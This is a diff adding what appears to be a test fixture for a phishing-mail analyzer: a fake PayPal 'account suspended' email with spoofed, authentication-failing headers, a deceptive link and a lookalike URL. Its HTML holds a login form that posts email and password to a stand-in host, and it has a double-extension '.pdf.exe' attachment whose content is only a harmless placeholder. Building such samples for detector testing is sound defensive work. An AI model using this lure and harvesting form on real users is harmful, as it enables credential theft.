@@ -1,0 +1,65 @@
+Return-Path: <bounce@mailer-security-update.example>
+Received: from compromised-host.example (unknown [198.51.100.23])
+ by mx.example.net with ESMTP id SAMPLE123
+ for <victim@example.com>; Thu, 11 Jun 2026 13:45:00 +0000
+Authentication-Results: mx.example.net;
+ spf=fail smtp.mailfrom=mailer-security-update.example;
+ dkim=fail header.d=account-review.example;
+ dmarc=fail header.from=paypal-security.example
+From: PayPal Security <support@paypal-security.example>
+Reply-To: verification@account-review.example
+To: victim@example.com
+Date: Thu, 11 Jun 2026 13:45:00 +0000
+Message-ID: <sample-alert-20260611@mailer-security-update.example>
+Subject: Urgent action required: Account suspended - verify now
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY-PHISHING-SAMPLE"
+
+--BOUNDARY-PHISHING-SAMPLE
+Content-Type: multipart/alternative; boundary="ALT-PHISHING-SAMPLE"
+
+--ALT-PHISHING-SAMPLE
+Content-Type: text/plain; charset="utf-8"
+
+This is a safe fake phishing sample for analyzer testing only.
+
+Your PayPal account suspended notice requires urgent action.
+Verify your account immediately to avoid account closure.
+
+Suspicious login link:
+http://192.0.2.10/login/verify-account
+
+--ALT-PHISHING-SAMPLE
+Content-Type: text/html; charset="utf-8"
+
+<!doctype html>
+<html>
+  <body>
+    <h1>PayPal Security Alert</h1>
+    <p><strong>Account suspended</strong>: Verify your account immediately to restore access.</p>
+    <p>This safe sample is for phishing-mail-analyzer testing only.</p>
+    <p>
+      <a href="http://192.0.2.10/login/verify-account">https://paypal.com/login</a>
+    </p>
+    <p>
+      Backup login URL:
+      <a href="http://secure-paypal-update.example/login">Verify your account</a>
+    </p>
+    <form action="http://192.0.2.10/collect" method="post">
+      <input type="text" name="email" value="" />
+      <input type="password" name="password" value="" />
+    </form>
+    <p style="display:none">hidden tracking text for analyzer test only</p>
+  </body>
+</html>
+
+--ALT-PHISHING-SAMPLE--
+
+--BOUNDARY-PHISHING-SAMPLE
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="suspicious_invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+
+U0FGRSBURVNUIEFUVEFDSE1FTlQgTUVUQURBVEEgT05MWS4=
+
+--BOUNDARY-PHISHING-SAMPLE--
